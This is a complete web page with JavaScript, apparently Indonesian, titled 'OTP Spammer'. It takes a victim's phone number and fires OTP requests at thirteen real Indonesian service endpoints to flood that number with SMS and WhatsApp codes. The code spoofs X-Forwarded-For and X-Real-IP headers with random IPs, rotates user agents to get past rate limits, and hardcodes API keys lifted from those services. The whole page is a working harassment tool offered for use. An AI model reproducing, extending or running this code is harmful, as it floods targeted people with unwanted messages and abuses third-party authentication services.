<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Spam Web</title>
    <style>
        * { box-sizing: border-box; font-family: system-ui, sans-serif; }
        body { background: #0d1117; color: #e6edf3; padding: 20px; max-width: 600px; margin: auto; }
        .card { background: #161b22; border-radius: 16px; padding: 24px; border: 1px solid #30363d; }
        h1 { font-size: 24px; margin-top: 0; color: #f0883e; }
        label { display: block; margin: 16px 0 8px; font-weight: 600; }
        input, select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #e6edf3; font-size: 16px; }
        button { width: 100%; padding: 14px; margin-top: 20px; background: #f0883e; color: #0d1117; font-weight: 700; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #log { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 12px; max-height: 400px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-all; margin-top: 16px; }
        .status { display: flex; justify-content: space-between; margin-top: 12px; font-size: 14px; }
        .success { color: #3fb950; }
        .failed { color: #f85149; }
        .progress { width: 100%; height: 6px; background: #30363d; border-radius: 4px; margin-top: 12px; }
        .progress-bar { height: 100%; background: #f0883e; border-radius: 4px; width: 0%; transition: width 0.3s; }
    </style>
</head>
<body>

<div class="card">
    <h1>📱 OTP Spammer</h1>
    <p style="color: #8b949e; margin-bottom: 8px;">Gunakan dengan bijak. Semua request dikirim dari browser Anda.</p>

    <label for="phone">Nomor HP (awalan 08 atau 62)</label>
    <input type="text" id="phone" placeholder="08123456789" value="08123456789">

    <label for="concurrent">Konkuren (request serentak)</label>
    <select id="concurrent">
        <option value="1">1 (default)</option>
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="5">5</option>
    </select>

    <button id="btnStart">🚀 Mulai Spam</button>
    <button id="btnStop" style="display:none; background:#f85149;">⏹ Stop</button>

    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
    <div class="status">
        <span id="statusText">Siap</span>
        <span><span class="success" id="successCount">0</span> ✅ | <span class="failed" id="failedCount">0</span> ❌</span>
    </div>
    <div id="log">📋 Log akan muncul di sini...</div>
</div>

<script>
// ========== KONFIGURASI ==========
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

function randomUA() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
function randomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
function randomUUID() { return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { const r = Math.random()*16|0; return (c==='x'?r:(r&0x3|0x8)).toString(16); }); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ========== NORMALISASI NOMOR ==========
function normalizePhone(phone) {
    let p = phone.replace(/[^0-9]/g, '');
    if (p.startsWith('0')) p = '62' + p.slice(1);
    if (!p.startsWith('62')) p = '62' + p;
    return p;
}

// ========== DAFTAR ENDPOINT (mirip versi Node.js) ==========
function getEndpoints(phone) {
    const p08 = '0' + phone.slice(2);
    const p62 = phone;
    const pNoCountry = phone.replace('62', '');
    const email = `user${Math.floor(Math.random()*9999)}@bwmyga.com`;
    const deviceId = randomUUID();

    return [
        { url: 'https://api.maulagi.id/api/v2/auth/check', data: { credentials: p62 }, headers: { 'X-ML-KEY': 'B10JLPEP10' } },
        { url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation', data: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' } },
        { url: 'https://www.bonusbelanja.com/api/auth/registration/app', data: { phone: p62, name: 'User', agreeTnc: true, agreeContact: false } },
        { url: 'https://www.alodokter.com/resend-otp', data: { user: { phone: p08, uuid: randomUUID() }, request_via: 'whatsapp' } },
        { url: 'https://www.beautyhaul.com/ajax/account/send_otp', data: { method: 'WhatsApp', phone: p62 } },
        { url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id', data: { nama_lengkap: 'User', telepon: p08, email: `user${Math.floor(Math.random()*9999)}@mail.com` }, headers: { 'Xid': String(Math.floor(Math.random()*9999999)), 'source': 'ocistok' } },
        { url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { 'x-api-key': '280999!FTTH' } },
        { url: 'https://api.dokterin.id/user/v1/users/login', data: { phone: p62, tnc_accept: true, device_id: randomUUID() } },
        { url: 'https://api.paper.id/api/v1/auth/login', data: { method: 'whatsapp', phone: p08 }, headers: { 'x-paper-user-agent': 'Jupiter/7.19.5', 'request-id': randomUUID() } },
        { url: 'https://api.indodax.com/api/v1/otp/send', data: { email: email, flow: 'register', method: 'whatsapp', old_uuid: '' }, headers: { 'key': 'bAGUG2WiLy', 'authorization': 'Bearer bAGUG2WiLy' } },
        { url: 'https://cms.bunda.co.id/api/v1/auth/send-otp', data: { phone_number: p62, type: 'auth' }, headers: { 'X-Locale': 'id' } },
        { url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode', data: { phone_number: p08 } },
        { url: 'https://saturdays.com/api/v1/auth/otp', data: { phone: p62, type: 'register' } }
    ];
}

// ========== KIRIM REQUEST ==========
async function sendRequest(endpoint, idx, signal) {
    const headers = {
        'Content-Type': 'application/json',
        'User-Agent': randomUA(),
        'X-Forwarded-For': randomIP(),
        'X-Real-IP': randomIP(),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'id-ID,id;q=0.9',
        ...(endpoint.headers || {})
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000);

    try {
        const resp = await fetch(endpoint.url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(endpoint.data),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        const body = await resp.json().catch(() => ({}));

        if ([200, 201, 202, 204].includes(resp.status)) return true;
        if (body.success === true || body.status === 'success' || body.statusCode === 200 ||
            body.message === 'OTP terkirim' || body.message === 'Success.' ||
            (body.data && (body.data.otp === 'processed' || body.data.status === 1))) {
            return true;
        }
        return false;
    } catch (e) {
        clearTimeout(timeoutId);
        if (e.name === 'AbortError') return false;
        return false;
    }
}

// ========== UI LOGIC ==========
const logEl = document.getElementById('log');
const statusText = document.getElementById('statusText');
const successCount = document.getElementById('successCount');
const failedCount = document.getElementById('failedCount');
const progressBar = document.getElementById('progressBar');
const btnStart = document.getElementById('btnStart');
const btnStop = document.getElementById('btnStop');

let running = false;
let stopFlag = false;

function addLog(msg) {
    const time = new Date().toLocaleTimeString();
    logEl.textContent += `[${time}] ${msg}\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

async function main() {
    const phoneInput = document.getElementById('phone').value.trim();
    if (!phoneInput) { addLog('❌ Masukkan nomor HP!'); return; }
    const phone = normalizePhone(phoneInput);
    if (!phone.startsWith('62') || phone.length < 10) { addLog('❌ Format nomor salah (gunakan 08xxx atau 62xxx)'); return; }

    const concurrent = parseInt(document.getElementById('concurrent').value);
    const endpoints = getEndpoints(phone);
    let success = 0, failed = 0;
    let index = 0;

    running = true;
    stopFlag = false;
    btnStart.disabled = true;
    btnStart.style.display = 'none';
    btnStop.style.display = 'block';
    logEl.textContent = '';
    successCount.textContent = '0';
    failedCount.textContent = '0';
    progressBar.style.width = '0%';
    statusText.textContent = '🔄 Berjalan...';

    addLog(`🎯 Target: ${phone}`);
    addLog(`📡 Total endpoints: ${endpoints.length}`);
    addLog(`⚡ Konkuren: ${concurrent}`);

    const worker = async () => {
        while (running && index < endpoints.length) {
            const idx = index++;
            const endpoint = endpoints[idx];
            if (!endpoint) break;

            const result = await sendRequest(endpoint, idx);
            if (result) { success++; addLog(`✅ ${new URL(endpoint.url).hostname}`); }
            else { failed++; addLog(`❌ ${new URL(endpoint.url).hostname}`); }

            successCount.textContent = success;
            failedCount.textContent = failed;
            progressBar.style.width = `${((success + failed) / endpoints.length * 100)}%`;

            // delay antar request
            await sleep(3000 + Math.random() * 2000);
        }
    };

    const workers = [];
    for (let i = 0; i < concurrent; i++) {
        workers.push(worker());
    }
    await Promise.all(workers);

    running = false;
    statusText.textContent = '✅ Selesai!';
    btnStart.disabled = false;
    btnStart.style.display = 'block';
    btnStop.style.display = 'none';
    addLog(`📊 Selesai. Berhasil: ${success}, Gagal: ${failed}`);
}

btnStart.addEventListener('click', main);
btnStop.addEventListener('click', () => {
    running = false;
    stopFlag = true;
    statusText.textContent = '⏹ Dihentikan';
    btnStart.disabled = false;
    btnStart.style.display = 'block';
    btnStop.style.display = 'none';
    addLog('⏹ Proses dihentikan oleh user.');
});
</script>
</body>
</html>
